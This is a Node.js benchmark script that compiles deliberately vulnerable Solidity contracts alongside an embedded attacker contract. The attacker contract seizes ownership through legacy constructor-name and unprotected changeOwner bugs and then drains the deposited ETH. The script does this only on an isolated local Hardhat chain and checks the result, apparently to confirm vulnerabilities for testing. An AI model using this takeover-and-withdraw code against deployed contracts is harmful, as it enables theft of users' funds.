'use strict';

const fs = require('node:fs');
const path = require('node:path');
const crypto = require('node:crypto');

const root = process.env.CAMPAIGN_PROJECT_ROOT || path.resolve(__dirname, '..');
const deps = path.join(root, 'flare-scan/contracts/firelight-core/node_modules');
process.env.HARDHAT_CONFIG = path.join(root, 'scripts/local-test-hardhat.cjs');
const hre = require(path.join(deps, 'hardhat'));
const { BrowserProvider, ContractFactory, Contract } = require(path.join(deps, 'ethers'));
const solcLoader = require(path.join(root, 'flare-scan/tools/solc-0819/node_modules/solc'));
const solc = solcLoader.setupMethods(require(process.env.CAMPAIGN_SOLJSON));
const { LOCAL_CHAIN_ID, parseForkConfig, publicBoundary } = require('./dynamic-execution-boundary.cjs');

const CASES = Object.freeze({
  '02-incorrect_constructor_name1': {
    file: 'incorrect_constructor_name1.sol', contract: 'Missing', version: '0.4.24', takeover: 'IamMissing',
  },
  '03-simple_suicide': {
    file: 'incorrect_constructor_name2.sol', contract: 'Missing', version: '0.4.24', takeover: 'missing',
  },
  '04-unprotected0': {
    file: 'unprotected0.sol', contract: 'Unprotected', version: '0.4.15', takeover: 'changeOwner',
  },
});

const ATTACKER_SOURCE = `pragma solidity >=0.4.15 <0.5.0;
contract AccessTarget {
    function IamMissing() public;
    function missing() public;
    function changeOwner(address newOwner) public;
    function withdraw() public;
}
contract OwnershipTakeover {
    function attack(address target, uint8 takeoverKind) public {
        AccessTarget victim = AccessTarget(target);
        if (takeoverKind == 1) victim.IamMissing();
        else if (takeoverKind == 2) victim.missing();
        else revert();
        victim.withdraw();
    }
    function() public payable {}
}
`;

function digest(value) {
  return crypto.createHash('sha256').update(value, 'utf8').digest('hex');
}

function compile(sources) {
  const input = {
    language: 'Solidity', sources,
    settings: { optimizer: { enabled: false }, outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } } },
  };
  const output = JSON.parse(solc.compile(JSON.stringify(input)));
  const errors = (output.errors || []).filter((item) => item.severity === 'error');
  if (errors.length) throw new Error(`source_compile_failed:${errors.map((item) => item.formattedMessage).join('\n')}`);
  return output.contracts;
}

function artifact(contracts, file, name) {
  const item = contracts?.[file]?.[name];
  if (!item?.abi || !item?.evm?.bytecode?.object) throw new Error(`artifact_missing:${file}:${name}`);
  return item;
}

async function deploy(provider, signer, item, args = [], overrides = {}) {
  const deploymentArgs = [...args];
  if (Object.keys(overrides).length) deploymentArgs.push(overrides);
  const contract = await new ContractFactory(item.abi, item.evm.bytecode.object, signer).deploy(...deploymentArgs);
  const receipt = await contract.deploymentTransaction().wait();
  if (receipt.status !== 1) throw new Error('deployment_failed');
  await contract.waitForDeployment();
  return { contract, receipt };
}

async function expectUnauthorizedWithdraw(targetAddress, signer) {
  const target = new Contract(targetAddress, ['function withdraw()'], signer);
  try {
    await target.getFunction('withdraw').staticCall();
    return false;
  } catch {
    return true;
  }
}

function addressAtSlot(word) {
  return `0x${String(word).slice(-40)}`.toLowerCase();
}

(async () => {
  const caseId = process.argv[2];
  const sourcePath = path.resolve(process.argv[3] || '');
  const spec = CASES[caseId];
  if (!spec || path.basename(sourcePath) !== spec.file) throw new Error('invalid_case_source');
  const source = fs.readFileSync(sourcePath, 'utf8');
  const sourceSha256 = digest(source);
  const reportedVersion = String(process.env.BENCHMARK_SOLC_VERSION || '').split('+', 1)[0];
  const actualVersion = String(solc.version());
  if (reportedVersion !== spec.version || actualVersion.split('+', 1)[0] !== spec.version) {
    throw new Error(`benchmark_requires_exact_solc_${spec.version}`);
  }
  const compilerArtifactSha256 = String(process.env.BENCHMARK_SOLC_SHA256 || '');
  if (!/^(?:0x)?[a-f0-9]{64}$/i.test(compilerArtifactSha256)) throw new Error('benchmark_compiler_hash_missing');
  const fork = parseForkConfig(process.env);
  if (fork.requested || !fork.valid) throw new Error('benchmark_requires_isolated_local_evm');
  if (hre.network.name !== 'hardhat' || hre.network.config.url || hre.network.config.forking) {
    throw new Error('benchmark_evm_not_isolated');
  }

  const sourceFile = path.basename(sourcePath);
  const compiled = compile({ [sourceFile]: { content: source }, 'AttackHarness.sol': { content: ATTACKER_SOURCE } });
  const targetArtifact = artifact(compiled, sourceFile, spec.contract);
  const attackerArtifact = artifact(compiled, 'AttackHarness.sol', 'OwnershipTakeover');
  const provider = new BrowserProvider(hre.network.provider);
  const chainId = Number((await provider.getNetwork()).chainId);
  if (chainId !== LOCAL_CHAIN_ID) throw new Error('benchmark_chain_id_mismatch');
  const owner = await provider.getSigner(0);
  const attacker = await provider.getSigner(1);
  const funder = await provider.getSigner(2);
  const ownerAddress = await owner.getAddress();
  const attackerSignerAddress = await attacker.getAddress();
  const funderAddress = await funder.getAddress();
  const targetDeployment = await deploy(provider, owner, targetArtifact);
  const targetAddress = await targetDeployment.contract.getAddress();
  let exploit = null;
  let exploitAddress = attackerSignerAddress;
  const transactionHashes = [targetDeployment.receipt.hash];
  if (caseId !== '04-unprotected0') {
    const attackerDeployment = await deploy(provider, attacker, attackerArtifact);
    exploit = attackerDeployment.contract;
    exploitAddress = await exploit.getAddress();
    transactionHashes.push(attackerDeployment.receipt.hash);
  }
  const funding = 1000000000000000000n;
  let beforeBalance = 0n;

  if (caseId !== '04-unprotected0') {
    const fundingReceipt = await (await funder.sendTransaction({ to: targetAddress, value: funding })).wait();
    transactionHashes.push(fundingReceipt.hash);
    beforeBalance = await provider.getBalance(targetAddress, fundingReceipt.blockNumber);
  }

  const ownerBeforeWord = await provider.send('eth_getStorageAt', [targetAddress, '0x0', 'latest']);
  const ownerBefore = addressAtSlot(ownerBeforeWord);
  const unauthorizedWithdrawRejected = caseId === '04-unprotected0'
    ? null : await expectUnauthorizedWithdraw(targetAddress, attacker);
  let unauthorizedOwnerChangeSucceeded = null;
  const expectedOwnerBefore = caseId === '04-unprotected0' ? ownerAddress.toLowerCase() : '0x0000000000000000000000000000000000000000';
  const takeoverKind = caseId === '02-incorrect_constructor_name1' ? 1 : 2;
  let attackReceipt = null;
  let ownerAfterTakeover = null;
  let attackError = null;
  try {
    if (caseId === '04-unprotected0') {
      const target = new Contract(targetAddress, ['function changeOwner(address)'], attacker);
      attackReceipt = await (await target.getFunction('changeOwner')(attackerSignerAddress, { gasLimit: 500000 })).wait();
      unauthorizedOwnerChangeSucceeded = attackReceipt.status === 1;
      const takeoverWord = await provider.send('eth_getStorageAt', [targetAddress, '0x0', 'latest']);
      ownerAfterTakeover = addressAtSlot(takeoverWord);
    } else {
      attackReceipt = await (await exploit.getFunction('attack')(targetAddress, takeoverKind, { gasLimit: 1000000 })).wait();
    }
  } catch (error) {
    attackReceipt = error.receipt || null;
    attackError = String(error.shortMessage || error.message || 'attack_reverted').slice(0, 500);
  }
  if (attackReceipt?.hash) transactionHashes.push(attackReceipt.hash);
  const resultBlock = attackReceipt?.blockNumber || 'latest';
  const afterBalance = await provider.getBalance(targetAddress, resultBlock);
  const attackerReceived = caseId === '04-unprotected0'
    ? 0n : await provider.getBalance(exploitAddress, resultBlock);
  const ownerAfterWord = await provider.send('eth_getStorageAt', [targetAddress, '0x0', 'latest']);
  const ownerAfter = addressAtSlot(ownerAfterWord);
  const confirmed = caseId === '04-unprotected0'
    ? attackReceipt?.status === 1
      && unauthorizedOwnerChangeSucceeded
      && ownerBefore === expectedOwnerBefore
      && ownerAfterTakeover === attackerSignerAddress.toLowerCase()
      && ownerAfter === attackerSignerAddress.toLowerCase()
    : attackReceipt?.status === 1
      && beforeBalance === funding
      && afterBalance === 0n
      && attackerReceived === funding
      && unauthorizedWithdrawRejected
      && ownerBefore === expectedOwnerBefore
      && ownerAfter === exploitAddress.toLowerCase();
  const result = {
    schemaVersion: 1,
    caseId,
    state: confirmed ? 'passed' : 'failed',
    confirmedVulnerability: confirmed,
    proofScope: caseId === '04-unprotected0'
      ? 'unauthorized_owner_reassignment'
      : 'unauthorized_ownership_takeover_and_asset_withdrawal',
    vulnerability: 'access_control',
    mode: 'isolated_in_process',
    compilerVersion: actualVersion,
    compilerArtifactSha256,
    compilerKind: 'solc-js-original-source',
    sourceSha256,
    sourceBundleSha256: digest(JSON.stringify({
      [sourceFile]: source,
      'AttackHarness.sol': ATTACKER_SOURCE,
    })),
    targetAddress,
    attackerAddress: exploitAddress,
    attackerSignerAddress,
    funderAddress,
    beforeTargetBalanceWei: beforeBalance.toString(),
    afterTargetBalanceWei: afterBalance.toString(),
    attackerReceivedWei: attackerReceived.toString(),
    ownerBefore,
    ownerAfterTakeover,
    ownerAfter,
    unauthorizedWithdrawRejected,
    unauthorizedOwnerChangeSucceeded,
    attackStatus: attackReceipt?.status ?? null,
    attackError,
    transactionHashes,
    executionBoundary: publicBoundary(fork, { chainId, forkState: 'not_performed' }),
    reason: confirmed ? null : caseId === '04-unprotected0'
      ? 'owner_reassignment_assertion_failed' : 'ownership_or_withdrawal_assertion_failed',
    reproduction: caseId === '04-unprotected0'
      ? '部署者先持有 owner；攻击者以普通 EOA 调用未受保护的 changeOwner(address)，并在本地 EVM 中观察 owner 存储槽由部署者地址变为攻击者地址。'
      : `攻击者调用公开的旧式 ${spec.takeover}() 取得 owner，再经 withdraw 提取受害者注入的 ETH。`,
  };
  process.stdout.write(`${JSON.stringify(result)}\n`);
  if (!confirmed) process.exitCode = 1;
})().catch((error) => {
  process.stderr.write(`${error.stack || error}\n`);
  process.exitCode = 2;
});
